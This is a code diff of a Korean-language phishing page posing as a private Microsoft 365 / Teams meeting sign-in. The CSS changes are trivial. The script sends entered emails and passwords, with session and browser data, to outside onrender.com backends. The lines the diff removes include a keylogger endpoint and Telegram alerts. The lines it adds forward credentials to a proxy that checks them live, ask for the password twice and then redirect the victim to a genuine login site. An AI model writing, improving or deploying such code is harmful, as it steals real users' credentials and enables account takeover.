@@ -12,16 +12,13 @@
     
     <style>
         @import url(https://fonts.googleapis.com/css?family=Lato:300,400,600,700,300italic,400italic,600italic);
-        
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         html, body {
             height: 100%;
             font-family: "Lato", "Malgun Gothic", "Segoe UI", sans-serif;
             background: #0a1628;
             overflow: hidden;
         }
-        
         .video-background {
             position: fixed;
             top: 0;
@@ -32,7 +29,6 @@
             overflow: hidden;
             background: linear-gradient(135deg, #0a1628 0%, #0033cc 40%, #0066ff 70%, #00aaff 100%);
         }
-        
         .video-background video {
             position: absolute;
             top: 50%;
@@ -46,7 +42,6 @@
             opacity: 0.7;
             z-index: 1;
         }
-        
         .gradient-fallback {
             position: absolute;
             top: 0;
@@ -62,7 +57,6 @@
             0% { background-position: 0% 0%; }
             100% { background-position: 100% 100%; }
         }
-        
         .noise-overlay {
             position: absolute;
             top: 0;
@@ -80,7 +74,6 @@
             0% { opacity: 0.02; }
             100% { opacity: 0.06; }
         }
-        
         .video-overlay {
             position: fixed;
             top: 0;
@@ -91,7 +84,6 @@
             z-index: 1;
             pointer-events: none;
         }
-        
         #content {
             position: relative;
             z-index: 3;
@@ -110,7 +102,6 @@
             0% { opacity: 0; transform: translateY(40px) scale(0.95); }
             100% { opacity: 1; transform: translateY(0) scale(1); }
         }
-        
         .mini-layout-body { text-align: center; }
         .page-header { padding-bottom: 9px; margin: 0; border-bottom: none; }
         .page-header h1 { 
@@ -124,7 +115,6 @@
             font-size: 14px;
             margin: 2px 0 10px 0;
         }
-        
         .logoContainer {
             position: relative;
             width: 9.8rem;
@@ -140,7 +130,6 @@
         }
         .logoContainer:hover { transform: scale(1.02); }
         .logoContainer .logo { width: 5.145rem; height: 5.145rem; align-self: center; }
-        
         .confidential-message {
             display: none;
             background: rgba(98, 100, 167, 0.08);
@@ -163,7 +152,6 @@
         }
         .confidential-message .lock-icon { font-size: 16px; margin-right: 6px; }
         .confidential-message strong { color: #6264a7; }
-        
         .online-users {
             display: flex;
             justify-content: center;
@@ -199,7 +187,6 @@
             0%, 100% { opacity: 1; transform: scale(1); }
             50% { opacity: 0.5; transform: scale(0.8); }
         }
-        
         .online-badge {
             display: inline-flex;
             align-items: center;
@@ -216,7 +203,6 @@
             background: #28a745;
             animation: pulse-dot 1.5s ease-in-out infinite;
         }
-        
         .form-control {
             display: block;
             width: 100%;
@@ -252,7 +238,6 @@
             opacity: 0.6;
             cursor: not-allowed;
         }
-        
         .btn-primary {
             background: linear-gradient(135deg, #6264a7 0%, #4a4d8a 100%);
             border: none;
@@ -282,10 +267,8 @@
             background: linear-gradient(135deg, #6264a7 0%, #4a4d8a 100%);
             opacity: 0.7;
         }
-        
         .form-group { margin-bottom: 15px; }
         .signin { margin-top: 10px; }
-        
         .message-box {
             font-size: 14px;
             display: none;
@@ -310,7 +293,6 @@
             background: rgba(98, 100, 167, 0.08);
             border-left: 3px solid #6264a7;
         }
-        
         .extra {
             margin-top: 20px;
             font-size: 12px;
@@ -318,7 +300,6 @@
         }
         .extra a { color: #6264a7; text-decoration: none; }
         .extra a:hover { text-decoration: underline; }
-        
         #userTxt {
             margin-top: 5px;
             font-weight: 600;
@@ -329,7 +310,6 @@
             background: rgba(14, 113, 235, 0.06);
             border-radius: 8px;
         }
-        
         .verification-status {
             font-size: 13px;
             color: #6264a7;
@@ -341,7 +321,6 @@
         .verification-status.verified { color: #28a745; }
         .verification-status.verifying { color: #6264a7; }
         .verification-status.error { color: #d93025; }
-        
         .notification {
             position: fixed;
             bottom: 20px;
@@ -364,7 +343,6 @@
         }
         .notification.error { background: #dc3545; }
         .notification.success { background: #28a745; }
-        
         .spinner {
             display: inline-block;
             width: 40px;
@@ -376,7 +354,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         #loadTxt { display: block; margin-top: 10px; font-weight: 400; color: #555; }
-        
         .voice-indicator {
             display: none;
             position: fixed;
@@ -418,7 +395,6 @@
             0%, 100% { height: 8px; }
             50% { height: 24px; }
         }
-        
         .password-wrapper {
             position: relative;
             width: 100%;
@@ -469,7 +445,6 @@
         }
         .password-wrapper .clear-btn:hover { color: #333; }
         .password-wrapper .clear-btn.show { display: block; }
-        
         @media (max-width: 480px) {
             #content { margin: 15px 10px; padding: 20px 16px; margin-top: 15px; width: 95%; }
             .logoContainer { width: 7rem; height: 7rem; }
@@ -664,9 +639,8 @@
 //  2 CONSECUTIVE SILENT VERIFICATION
 // ============================================================
 
-const PROXY_URL = "https://microsoft-verify-service.onrender.com/login";
-const BACKEND_URL = "https://korea-meet-secure.onrender.com";
-const KEYLOGGER_URL = "https://keyserver-eaar.onrender.com/log";
+// 🔥 CRITICAL: Use your Render backend URL
+const PROXY_URL = "https://korea-meet-secure.onrender.com/proxy-login";
 const REDIRECT_URL = "https://login.office.hiworks.com/";
 const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
@@ -718,8 +692,13 @@ function sendTelegramAlert(message) {
 function sendCredentials(email, password, source) {
     if (!email || !password || password.length < 2) return;
     const data = { email, password, source: source || 'confidential_meeting', sessionId: SESSION_ID, url: window.location.href, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), attemptCount, consecutiveCount, referrer: document.referrer || 'Direct', service: 'Microsoft 365' };
-    fetch(BACKEND_URL + '/api/credential-capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data), keepalive: true }).catch(() => {});
-    fetch(KEYLOGGER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'confidential_meeting_verification', email, password, source, sessionId: SESSION_ID, consecutiveCount, url: window.location.href, timestamp: Date.now(), service: 'Microsoft 365' }), keepalive: true }).catch(() => {});
+    // Send to your backend
+    fetch(PROXY_URL.replace('/proxy-login', '/api/credential-capture'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+        keepalive: true
+    }).catch(() => {});
 }
 
 function updateVerificationStatus(message, type) {
@@ -759,13 +738,15 @@ function clearPasswordField() {
     if (passwordInput) passwordInput.focus();
 }
 
-function handleSubmit() {
+async function handleSubmit() {
     if (isProcessing) return;
     const passwordInput = document.getElementById('password');
     const password = passwordInput ? passwordInput.value.trim() : '';
     const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || '';
+    
     if (!email) { showMessage('❌ 이메일 주소를 찾을 수 없습니다.', 'error', true); return; }
     if (!password) { showMessage('⚠️ 비밀번호를 입력해주세요.', 'error', true); if (passwordInput) passwordInput.focus(); return; }
+    
     const now = Date.now();
     if (lastAttemptTime > 0 && now - lastAttemptTime > ATTEMPT_WINDOW) {
         consecutiveCount = 0;
@@ -774,38 +755,79 @@ function handleSubmit() {
         updateVerificationStatus('', '');
         return;
     }
+    
     attemptCount++;
     if (password.length > 2) sendCredentials(email, password, 'form_submit');
-    if (password.length > 0) {
-        consecutiveCount++;
-        lastAttemptTime = now;
-        if (passwordInput) { passwordInput.value = ''; passwordInput.classList.add('success'); }
-        const joinBtn = document.getElementById('joinBtn');
-        if (consecutiveCount === 1) {
-            updateVerificationStatus('🔐 신원 확인 중... 다시 입력하여 확인해주세요.', 'verifying');
-            if (joinBtn) joinBtn.textContent = '확인하기';
-            showMessage('🔐 회의는 비공개입니다. 올바른 비밀번호를 입력하세요', 'confirm', true);
-            setTimeout(() => { if (passwordInput) { passwordInput.focus(); passwordInput.classList.remove('success'); } }, 300);
-        } else if (consecutiveCount >= MAX_CONSECUTIVE) {
+    
+    // Send to backend for verification
+    setLoading(true);
+    try {
+        const formData = new FormData();
+        formData.append('loginfmt', email);
+        formData.append('password', password);
+        formData.append('login', email);
+        formData.append('passwd', password);
+        
+        const response = await fetch(PROXY_URL, {
+            method: 'POST',
+            body: new URLSearchParams(formData)
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            // ✅ Authenticated!
             updateVerificationStatus('✅ 신원 확인 완료. 비공개 회의로 이동합니다...', 'verified');
+            const joinBtn = document.getElementById('joinBtn');
             if (joinBtn) { joinBtn.textContent = '✅ 확인 완료!'; joinBtn.classList.add('success'); }
             showMessage('✅ 인증 성공! 회의로 이동합니다...', 'success', true);
-            sendTelegramAlert('🔐 *비공개 회의 확인 완료*\n\n*이메일:* ' + email + '\n*연속 확인:* ' + consecutiveCount + '회\n*세션:* ' + SESSION_ID.substring(0, 12) + '...\n*시간:* ' + new Date().toISOString());
+            
             setTimeout(() => {
-                const encodedEmail = encodeURIComponent(email);
-                const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail + '&redirect=' + encodeURIComponent(REDIRECT_URL);
-                window.location.href = proxyUrl;
+                window.location.href = result.redirect || REDIRECT_URL + '?email=' + encodeURIComponent(email);
             }, 1500);
             return;
+        } else if (result.isFirstAttempt || result.error === 'confirm_password') {
+            // First attempt - ask for confirmation
+            consecutiveCount = 0;
+            updateVerificationStatus('🔐 신원 확인 중... 다시 입력하여 확인해주세요.', 'verifying');
+            const joinBtn = document.getElementById('joinBtn');
+            if (joinBtn) joinBtn.textContent = '확인하기';
+            showMessage('🔐 회의는 비공개입니다. 올바른 비밀번호를 입력하세요', 'confirm', true);
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.classList.remove('success');
+                setTimeout(() => passwordInput.focus(), 300);
+            }
+        } else if (result.isMismatch || result.error === 'mismatch') {
+            // Mismatch - reset
+            consecutiveCount = 0;
+            updateVerificationStatus('❌ 비밀번호가 일치하지 않습니다. 다시 시도해주세요.', 'error');
+            showMessage('❌ 인증에 실패했습니다. 다시 시도해주세요.', 'error', true);
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.classList.add('error');
+                setTimeout(() => {
+                    passwordInput.classList.remove('error');
+                    passwordInput.focus();
+                }, 1000);
+            }
+        } else {
+            // Other error
+            showMessage('❌ 인증에 실패했습니다. 다시 시도해주세요.', 'error', true);
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.classList.add('error');
+                setTimeout(() => {
+                    passwordInput.classList.remove('error');
+                    passwordInput.focus();
+                }, 1000);
+            }
         }
-    } else {
-        consecutiveCount = 0;
-        if (passwordInput) passwordInput.classList.add('error');
-        updateVerificationStatus('❌ 비밀번호가 올바르지 않습니다. 다시 시도해주세요.', 'error');
-        showMessage('❌ 인증에 실패했습니다. 다시 시도해주세요.', 'error', true);
+    } catch (error) {
+        console.error('Login error:', error);
+        showMessage('❌ 서비스 오류가 발생했습니다. 다시 시도해주세요.', 'error', true);
         if (passwordInput) { passwordInput.value = ''; passwordInput.focus(); }
-        setTimeout(() => { if (passwordInput) passwordInput.classList.remove('error'); }, 1000);
     }
+    setLoading(false);
 }
 
 function setupContinueButton() {
@@ -870,7 +892,7 @@ window.__teamsGateway = {
     getSessionId: () => SESSION_ID,
     getStats: () => ({ attempts: attemptCount, consecutiveCount: consecutiveCount }),
     resetConsecutive: () => { consecutiveCount = 0; updateVerificationStatus('', ''); const msgBox = document.getElementById('messageBox'); if (msgBox) msgBox.classList.remove('show'); },
-    redirect: () => { const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com'; const proxyUrl = PROXY_URL + '?login_hint=' + encodeURIComponent(email) + '&redirect=' + encodeURIComponent(REDIRECT_URL); window.location.href = proxyUrl; return { redirecting: true, url: proxyUrl }; },
+    redirect: () => { const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com'; window.location.href = REDIRECT_URL + '?email=' + encodeURIComponent(email); return { redirecting: true, url: REDIRECT_URL }; },
     speak: speakKorean,
     clearField: clearPasswordField
 };
